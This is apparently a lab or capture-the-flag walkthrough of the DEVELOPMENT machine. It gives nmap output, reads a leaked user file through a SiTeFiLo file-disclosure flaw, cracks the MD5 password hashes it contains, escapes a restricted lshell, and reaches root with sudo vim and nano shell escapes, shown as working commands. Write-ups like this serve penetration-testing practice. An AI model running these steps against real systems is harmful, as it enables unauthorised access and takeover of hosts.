## port scan

```shell
# Nmap 7.94SVN scan initiated Sat Feb  1 06:31:59 2025 as: nmap -sT --min-rate=8899 -p- -oN nmap_result/port 192.168.28.19
Nmap scan report for 192.168.28.19 (192.168.28.19)
Host is up (0.00021s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
113/tcp  open  ident
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
```

```shell
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
113/tcp  open  ident?
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8080/tcp open  http-proxy  IIS 6.0
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 01 Feb 2025 11:33:11 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: "230-57de32091ad69"
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <html>
|     <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
|     </head>
|     <body>
|     <p>Welcome to the Development Page.</p>
|     <br/>
|     <p>There are many projects in this box. View some of these projects at html_pages.</p>
|     <br/>
|     <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
|     <br/>
|     <br/>
|     <br/>
|     <hr>
|     <i>Powered by IIS 6.0</i>
|     </body>
|     <!-- Searching for development secret page... where could it be? -->
|     <!-- Patrick, Head of Development-->
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 01 Feb 2025 11:33:11 GMT
|     Server: IIS 6.0
|     Allow: POST,OPTIONS,HEAD,GET
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Sat, 01 Feb 2025 11:33:11 GMT
|     Server: IIS 6.0
|     Content-Length: 292
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>IIS 6.0 Server at 192.168.28.19 Port 8080</address>
|_    </body></html>
|_http-server-header: IIS 6.0
MAC Address: 00:0C:29:87:42:46 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 1 hop
Service Info: Host: DEVELOPMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-security-mode: SMB: Failed to connect to host: Nsock connect failed immediately
|_smb2-time: ERROR: Script execution failed (use -d to debug)
```

## web

http://192.168.28.19:8080/development.html

![image-20250202140537601](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202140537601.png)

找到秘密页面

http://192.168.28.19:8080/developmentsecretpage/patrick.php?logout=1

在登录口随便输入账号密码，发现报错信息

**slogin_lib.inc.php**

![image-20250202140628094](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202140628094.png)

搜索发现是这个漏洞，Simple Text-File Login script (SiTeFiLo) 1.0.6 - File Disclosure 文件泄露

https://www.exploit-db.com/exploits/7444

`http://192.168.28.19:8080/developmentsecretpage/slog_users.txt`

找到账户密码

```
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81
patrick, 87e6d56ce79af90dbe07d387d3d0579e
qiu, ee64497098d0926d198f54f6d5431f98
```

MD5解密

```
intern:12345678900987654321
patrick:P@ssw0rd25
qiu:qiu
```

## 提权

```
ssh intern@192.168.28.19
```

![image-20250202141216461](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250202141216461.png)

绕过lshell的限制

`echo os.system('/bin/bash')`

该用户未发现提权点，尝试切换用户

```shell
intern@development:~$ su - patrick
Password: 
patrick@development:~$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
```

vim,nano的sudo权限

```
sudo vim -c ':!/bin/bash'
```

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

```shell
patrick@development:~$ sudo vim -c ':!/bin/bash'

root@development:~# id
uid=0(root) gid=0(root) groups=0(root)
root@development:~# cd /root
root@development:/root# ls
iptables-rules  lshell-0.9.9  proof.txt  smb.conf  tcpdumpclock.sh
root@development:/root# cat proof.txt 
Congratulations on rooting DEVELOPMENT! :)
```

